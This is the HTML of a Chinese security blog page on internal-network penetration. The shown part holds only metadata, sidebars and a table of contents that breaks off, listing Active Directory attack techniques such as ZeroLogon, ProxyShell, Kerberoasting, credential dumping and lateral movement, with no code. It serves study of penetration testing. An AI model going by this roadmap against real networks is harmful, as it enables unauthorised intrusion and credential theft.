<!DOCTYPE html><html lang="zh"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,minimum-scale=1,user-scalable=no,minimal-ui"><meta name="renderer" content="webkit"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><meta name="format-detection" content="telephone=no,email=no,adress=no"><meta name="theme-color" content="#000000"><meta http-equiv="window-target" content="_top"><title>内网安全（二）——补充版 | J3fffff&#39;s Blog</title><meta name="description" content="概述 鉴于之前的内网安全这篇文章所述内容与实战相差还是有点大，没有很清晰的思路或者更加常用的方法来进行内网渗透，这里将结合之前的部分知识，拓展内网渗透攻击面，其中会涉及到很多名词，例如：  委派机制（约束与非约束） Exchange、OWA的渗透 SYSVOL、NETLOGON目录、GPP目录等 …  但是万变不离其宗，思路为：   拿下边缘主机，做好权限维持，网段进行扫描发现主机  如若必要，"><meta property="og:type" content="article"><meta property="og:title" content="内网安全（二）——补充版"><meta property="og:url" content="https://j3f5.github.io/articles/2023/07/28/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89%E2%80%94%E2%80%94%E8%A1%A5%E5%85%85%E7%89%88/index.html"><meta property="og:site_name" content="J3fffff&#39;s Blog"><meta property="og:description" content="概述 鉴于之前的内网安全这篇文章所述内容与实战相差还是有点大，没有很清晰的思路或者更加常用的方法来进行内网渗透，这里将结合之前的部分知识，拓展内网渗透攻击面，其中会涉及到很多名词，例如：  委派机制（约束与非约束） Exchange、OWA的渗透 SYSVOL、NETLOGON目录、GPP目录等 …  但是万变不离其宗，思路为：   拿下边缘主机，做好权限维持，网段进行扫描发现主机  如若必要，"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://j3f5.github.io/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89%E2%80%94%E2%80%94%E8%A1%A5%E5%85%85%E7%89%88/640.png"><meta property="og:image" content="https://j3f5.github.io/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89%E2%80%94%E2%80%94%E8%A1%A5%E5%85%85%E7%89%88/image-20230629111115012.png"><meta property="og:image" content="https://j3f5.github.io/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89%E2%80%94%E2%80%94%E8%A1%A5%E5%85%85%E7%89%88/image-20230731164019438.png"><meta property="og:image" content="https://j3f5.github.io/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89%E2%80%94%E2%80%94%E8%A1%A5%E5%85%85%E7%89%88/image-20230731164100532.png"><meta property="og:image" content="https://j3f5.github.io/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89%E2%80%94%E2%80%94%E8%A1%A5%E5%85%85%E7%89%88/172605390-b7dfb995-c707-45cd-be78-9c7d2f23c4a5.png"><meta property="og:image" content="https://j3f5.github.io/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89%E2%80%94%E2%80%94%E8%A1%A5%E5%85%85%E7%89%88/image-20230807142555361.png"><meta property="og:image" content="https://j3f5.github.io/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89%E2%80%94%E2%80%94%E8%A1%A5%E5%85%85%E7%89%88/image-20230807141221331.png"><meta property="og:image" content="https://j3f5.github.io/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89%E2%80%94%E2%80%94%E8%A1%A5%E5%85%85%E7%89%88/4354ae02457d7d38ffbc01547a2005a1.jpeg"><meta property="og:image" content="https://j3f5.github.io/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89%E2%80%94%E2%80%94%E8%A1%A5%E5%85%85%E7%89%88/ccb1b9a6ca972b231f899c4bfc20694a.png"><meta property="og:image" content="https://j3f5.github.io/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89%E2%80%94%E2%80%94%E8%A1%A5%E5%85%85%E7%89%88/b012828c3eceb6b299a9f9e7f12adde1.png"><meta property="article:published_time" content="2023-07-28T02:07:35.000Z"><meta property="article:modified_time" content="2023-07-28T02:07:35.000Z"><meta property="article:author" content="Jeff"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://j3f5.github.io/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89%E2%80%94%E2%80%94%E8%A1%A5%E5%85%85%E7%89%88/640.png"><link rel="canonical" href="https://j3f5.github.io/articles/2023/07/28/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89%E2%80%94%E2%80%94%E8%A1%A5%E5%85%85%E7%89%88/index.html"><link rel="alternate" href="/atom.xml" title="J3fffff&#39;s Blog" type="application/atom+xml"><link rel="icon" href="/favicon.png" type="image/x-icon"><link rel="stylesheet" href="/css/style.css">   <link rel="stylesheet" href="/css/theme/monokai-hook.css"><link href="//cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.3.5/dist/jquery.fancybox.min.css" rel="stylesheet"><meta name="generator" content="Hexo 6.3.0"></head><body class="main-center theme-purple" itemscope itemtype="http://schema.org/WebPage"><header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="slimContent"><div class="navbar-header"><div class="profile-block text-center"><a id="avatar" href="https://github.com/j3f5" target="_blank"><img class="img-circle img-rotate" src="/images/avatar.jpg" width="200" height="200"></a><h2 id="name" class="hidden-xs hidden-sm">妄想星空</h2><h3 id="title" class="hidden-xs hidden-sm hidden-md">Web Pentestor</h3><small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> Guangzhou, China</small></div><div class="search" id="search-form-wrap"><form class="search-form sidebar-form"><div class="input-group"><input type="text" class="search-form-input form-control" placeholder="搜索"> <span class="input-group-btn"><button type="submit" class="search-form-submit btn btn-flat" onclick="return!1"><i class="icon icon-search"></i></button></span></div></form><div class="ins-search"><div class="ins-search-mask"></div><div class="ins-search-container"><div class="ins-input-wrapper"><input type="text" class="ins-search-input" placeholder="想要查找什么..." x-webkit-speech> <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button></div><div class="ins-section-wrapper"><div class="ins-section-container"></div></div></div></div></div><button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false"><span class="sr-only">Toggle navigation</span> <span class="icon-bar"></span> <span class="icon-bar"></span> <span class="icon-bar"></span></button></div><nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation"><ul class="nav navbar-nav main-nav menu-highlight"><li class="menu-item menu-item-home"><a href="/."><i class="icon icon-home-fill"></i> <span class="menu-title">首页</span></a></li><li class="menu-item menu-item-archives"><a href="/archives"><i class="icon icon-archives-fill"></i> <span class="menu-title">归档</span></a></li><li class="menu-item menu-item-categories"><a href="/categories"><i class="icon icon-folder"></i> <span class="menu-title">分类</span></a></li><li class="menu-item menu-item-tags"><a href="/tags"><i class="icon icon-tags"></i> <span class="menu-title">标签</span></a></li><li class="menu-item menu-item-about"><a href="/about"><i class="icon icon-cup-fill"></i> <span class="menu-title">关于</span></a></li></ul><ul class="social-links"><li><a href="https://github.com/j3f5" target="_blank" title="Github"><i class="icon icon-github"></i></a></li><li><a href="/atom.xml" target="_blank" title="Rss"><i class="icon icon-rss"></i></a></li></ul></nav></div></header><aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar"><div class="slimContent"><div class="widget"><h3 class="widget-title">公告</h3><div class="widget-body"><div id="board"><div class="content"><p>欢迎交流与分享经验!</p></div></div></div></div><div class="widget"><h3 class="widget-title">分类</h3><div class="widget-body"><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/JAVA%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/">JAVA安全基础</a><span class="category-list-count">3</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/JAVA%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/">渗透测试基础</a><span class="category-list-count">2</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%BC%80%E5%8F%91%E5%9F%BA%E7%A1%80/">开发基础</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9D%82/">杂</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a><span class="category-list-count">3</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%89%93%E9%9D%B6/">打靶</a><span class="category-list-count">2</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/">渗透测试基础</a><span class="category-list-count">21</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E8%BD%A6%E8%81%94%E7%BD%91%E5%9F%BA%E7%A1%80/">车联网基础</a><span class="category-list-count">4</span></li></ul></div></div><div class="widget"><h3 class="widget-title">标签</h3><div class="widget-body"><ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CAN/" rel="tag">CAN</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CSRF/" rel="tag">CSRF</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/JWT/" rel="tag">JWT</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RCE/" rel="tag">RCE</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SSRF/" rel="tag">SSRF</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XSS/" rel="tag">XSS</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XXE/" rel="tag">XXE</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a><span class="tag-list-count">6</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/waf%E7%BB%95%E8%BF%87/" rel="tag">waf绕过</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91/" rel="tag">业务逻辑</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%86%85%E7%BD%91/" rel="tag">内网</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8A%AB%E6%8C%81/" rel="tag">劫持</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8D%8F%E8%AE%AE/" rel="tag">协议</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/" rel="tag">博客搭建</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/" rel="tag">审计技巧</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%8F%90%E6%9D%83/" rel="tag">提权</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%95%B4%E4%BD%93%E6%B5%81%E7%A8%8B/" rel="tag">整体流程</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="tag">文件上传</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="tag">文件包含</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" rel="tag">文件读取</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/" rel="tag">权限提升</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7/" rel="tag">渗透技巧</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/" rel="tag">漏洞发现</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/" rel="tag">漏洞扫描</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%A0%B4%E8%A7%A3/" rel="tag">破解</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AF%8A%E6%96%AD/" rel="tag">诊断</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%B7%A8%E5%9F%9F/" rel="tag">跨域</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%BD%A6%E8%81%94%E7%BD%91%E6%A0%87%E5%87%86/" rel="tag">车联网标准</a><span class="tag-list-count">1</span></li></ul></div></div><div class="widget"><h3 class="widget-title">标签云</h3><div class="widget-body tagcloud"><a href="/tags/CAN/" style="font-size:13px">CAN</a> <a href="/tags/CSRF/" style="font-size:13.33px">CSRF</a> <a href="/tags/JWT/" style="font-size:13px">JWT</a> <a href="/tags/RCE/" style="font-size:13.33px">RCE</a> <a href="/tags/SSRF/" style="font-size:13px">SSRF</a> <a href="/tags/XSS/" style="font-size:13.67px">XSS</a> <a href="/tags/XXE/" style="font-size:13.33px">XXE</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size:14px">sql注入</a> <a href="/tags/waf%E7%BB%95%E8%BF%87/" style="font-size:13px">waf绕过</a> <a href="/tags/%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91/" style="font-size:13px">业务逻辑</a> <a href="/tags/%E5%86%85%E7%BD%91/" style="font-size:13px">内网</a> <a href="/tags/%E5%8A%AB%E6%8C%81/" style="font-size:13px">劫持</a> <a href="/tags/%E5%8D%8F%E8%AE%AE/" style="font-size:13px">协议</a> <a href="/tags/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/" style="font-size:13px">博客搭建</a> <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size:13px">反序列化</a> <a href="/tags/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/" style="font-size:13px">审计技巧</a> <a href="/tags/%E6%8F%90%E6%9D%83/" style="font-size:13px">提权</a> <a href="/tags/%E6%95%B4%E4%BD%93%E6%B5%81%E7%A8%8B/" style="font-size:13.33px">整体流程</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size:13.33px">文件上传</a> <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" style="font-size:13px">文件包含</a> <a href="/tags/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" style="font-size:13px">文件读取</a> <a href="/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/" style="font-size:13.33px">权限提升</a> <a href="/tags/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7/" style="font-size:13px">渗透技巧</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/" style="font-size:13px">漏洞发现</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/" style="font-size:13.33px">漏洞扫描</a> <a href="/tags/%E7%A0%B4%E8%A7%A3/" style="font-size:13px">破解</a> <a href="/tags/%E8%AF%8A%E6%96%AD/" style="font-size:13px">诊断</a> <a href="/tags/%E8%B7%A8%E5%9F%9F/" style="font-size:13px">跨域</a> <a href="/tags/%E8%BD%A6%E8%81%94%E7%BD%91%E6%A0%87%E5%87%86/" style="font-size:13px">车联网标准</a></div></div><div class="widget"><h3 class="widget-title">归档</h3><div class="widget-body"><ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/08/">八月 2023</a><span class="archive-list-count">10</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/07/">七月 2023</a><span class="archive-list-count">8</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/06/">六月 2023</a><span class="archive-list-count">22</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">五月 2023</a><span class="archive-list-count">13</span></li></ul></div></div><div class="widget"><h3 class="widget-title">最新文章</h3><div class="widget-body"><ul class="recent-post-list list-unstyled"><li><div class="item-thumb"><a href="/articles/2023/08/14/NTLM-relay%E5%A4%8D%E7%8E%B0/" class="thumb"><span class="thumb-image thumb-none"></span></a></div><div class="item-inner"><p class="item-category"></p><p class="item-title"><a href="/articles/2023/08/14/NTLM-relay%E5%A4%8D%E7%8E%B0/" class="title">NTLM-relay复现</a></p><p class="item-date"><time datetime="2023-08-14T07:55:16.000Z" itemprop="datePublished">2023-08-14</time></p></div></li><li><div class="item-thumb"><a href="/articles/2023/08/14/relay%E5%A4%8D%E7%8E%B0/" class="thumb"><span class="thumb-image thumb-none"></span></a></div><div class="item-inner"><p class="item-category"></p><p class="item-title"><a href="/articles/2023/08/14/relay%E5%A4%8D%E7%8E%B0/" class="title">relay复现</a></p><p class="item-date"><time datetime="2023-08-14T07:55:03.000Z" itemprop="datePublished">2023-08-14</time></p></div></li><li><div class="item-thumb"><a href="/articles/2023/08/14/PTT%E4%B8%8EMS14-068/" class="thumb"><span class="thumb-image thumb-none"></span></a></div><div class="item-inner"><p class="item-category"></p><p class="item-title"><a href="/articles/2023/08/14/PTT%E4%B8%8EMS14-068/" class="title">PTT与MS14-068</a></p><p class="item-date"><time datetime="2023-08-14T07:09:17.000Z" itemprop="datePublished">2023-08-14</time></p></div></li><li><div class="item-thumb"><a href="/articles/2023/08/14/MS14-068%E5%A4%8D%E7%8E%B0/" class="thumb"><span class="thumb-image thumb-none"></span></a></div><div class="item-inner"><p class="item-category"></p><p class="item-title"><a href="/articles/2023/08/14/MS14-068%E5%A4%8D%E7%8E%B0/" class="title">MS14-068复现</a></p><p class="item-date"><time datetime="2023-08-14T06:10:12.000Z" itemprop="datePublished">2023-08-14</time></p></div></li><li><div class="item-thumb"><a href="/articles/2023/08/11/BypassUAC%E6%8F%90%E6%9D%83/" class="thumb"><span class="thumb-image thumb-none"></span></a></div><div class="item-inner"><p class="item-category"></p><p class="item-title"><a href="/articles/2023/08/11/BypassUAC%E6%8F%90%E6%9D%83/" class="title">BypassUAC提权</a></p><p class="item-date"><time datetime="2023-08-11T01:13:32.000Z" itemprop="datePublished">2023-08-11</time></p></div></li></ul></div></div></div></aside><aside class="sidebar sidebar-toc collapse" id="collapseToc" itemscope itemtype="http://schema.org/WPSideBar"><div class="slimContent"><nav id="toc" class="article-toc"><h3 class="toc-title">文章目录</h3><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0"><span class="toc-number">1.</span> <span class="toc-text">概述</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text">信息搜集</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%AC%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">2.1.</span> <span class="toc-text">本机信息搜集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8"><span class="toc-number">2.1.1.</span> <span class="toc-text">手动</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%87%AA%E5%8A%A8%E5%8C%96%E8%84%9A%E6%9C%AC"><span class="toc-number">2.1.2.</span> <span class="toc-text">自动化脚本</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%9F%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">2.2.</span> <span class="toc-text">域信息搜集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">2.3.</span> <span class="toc-text">相关知识点</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#windows-%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E6%9C%BA%E5%88%B6"><span class="toc-number">2.3.1.</span> <span class="toc-text">windows 名称解析机制</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E6%9E%90%E9%A1%BA%E5%BA%8F"><span class="toc-number">2.3.1.1.</span> <span class="toc-text">解析顺序</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#llmnr"><span class="toc-number">2.3.1.2.</span> <span class="toc-text">LLMNR</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#netbios"><span class="toc-number">2.3.1.3.</span> <span class="toc-text">NetBios</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8A%95%E6%AF%92"><span class="toc-number">2.3.1.4.</span> <span class="toc-text">投毒</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ldap"><span class="toc-number">2.3.2.</span> <span class="toc-text">LDAP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E5%88%92%E5%88%86"><span class="toc-number">2.3.3.</span> <span class="toc-text">权限划分</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%9D%E6%AD%A5%E6%B8%97%E9%80%8F"><span class="toc-number">3.</span> <span class="toc-text">初步渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%B0%9D%E8%AF%95"><span class="toc-number">3.1.</span> <span class="toc-text">常见漏洞尝试</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#zerologonon%E5%9F%9F%E6%8E%A7admin-%E4%B8%BB%E6%9C%BAadmin"><span class="toc-number">3.1.1.</span> <span class="toc-text">ZeroLogonon【域控admin、主机admin】</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D"><span class="toc-number">3.1.1.1.</span> <span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">3.1.1.2.</span> <span class="toc-text">参考</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%9F%9F%E6%8E%A7admin-%E4%B8%BB%E6%9C%BAadmin"><span class="toc-number">3.1.2.</span> <span class="toc-text">永恒之蓝【域控admin、主机admin】</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sysvol-gpp-ms14-025"><span class="toc-number">3.1.3.</span> <span class="toc-text">SYSVOL &amp; GPP MS14-025</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86"><span class="toc-number">3.1.3.1.</span> <span class="toc-text">相关知识</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E8%B7%AF%E7%BA%BF"><span class="toc-number">3.1.3.2.</span> <span class="toc-text">攻击路线</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exchange%E7%9B%B8%E5%85%B3"><span class="toc-number">3.1.4.</span> <span class="toc-text">Exchange相关</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-2"><span class="toc-number">3.1.4.1.</span> <span class="toc-text">信息搜集</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#proxylogon"><span class="toc-number">3.1.4.2.</span> <span class="toc-text">proxylogon</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#proxyshell"><span class="toc-number">3.1.4.3.</span> <span class="toc-text">proxyshell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#privexchangecve-2019-07240686"><span class="toc-number">3.1.4.4.</span> <span class="toc-text">Privexchange(CVE-2019-0724&#x2F;0686)</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">3.2.</span> <span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#windows%E6%8F%90%E6%9D%83"><span class="toc-number">3.2.1.</span> <span class="toc-text">Windows提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#linux%E6%8F%90%E6%9D%83"><span class="toc-number">3.2.2.</span> <span class="toc-text">Linux提权</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3"><span class="toc-number">3.3.</span> <span class="toc-text">用户密码破解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E5%96%B7%E6%B4%92%E5%9B%BA%E5%AE%9A%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4%E8%B4%A6%E6%88%B7"><span class="toc-number">3.3.1.</span> <span class="toc-text">密码喷洒（固定密码，爆破账户）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#asreproast"><span class="toc-number">3.3.2.</span> <span class="toc-text">ASREPRoast</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#kerberoast"><span class="toc-number">3.3.3.</span> <span class="toc-text">Kerberoast</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#blind-kerberoasting"><span class="toc-number">3.3.4.</span> <span class="toc-text">Blind Kerberoasting</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cve-2022-33679-kerberos%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.3.5.</span> <span class="toc-text">CVE-2022-33679 Kerberos提权漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E7%82%B9-2"><span class="toc-number">3.4.</span> <span class="toc-text">相关知识点</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sysvol"><span class="toc-number">3.4.1.</span> <span class="toc-text">SYSVOL</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%87%AD%E8%AF%81-%E4%BB%A4%E7%89%8C%E5%92%8C%E5%93%88%E5%B8%8C%E4%BF%A1%E6%81%AF%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">4.</span> <span class="toc-text">凭证、令牌和哈希信息的利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%AD%E8%AF%81%E4%BB%A4%E7%89%8C%E6%8A%93%E5%8F%96%E6%9C%AC%E5%9C%B0%E7%AE%A1%E7%90%86%E5%91%98%E6%9D%83%E9%99%90"><span class="toc-number">4.1.</span> <span class="toc-text">凭证&#x2F;令牌抓取【本地管理员权限】</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%93%88%E5%B8%8C%E7%A0%B4%E8%A7%A3"><span class="toc-number">4.2.</span> <span class="toc-text">哈希破解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A8%A1%E6%8B%9F%E5%87%AD%E8%AF%81%E8%AE%BF%E9%97%AE%E6%9C%8D%E5%8A%A1"><span class="toc-number">4.3.</span> <span class="toc-text">模拟凭证，访问服务</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">5.</span> <span class="toc-text">横向移动</span></a><ol class="toc-child"><li 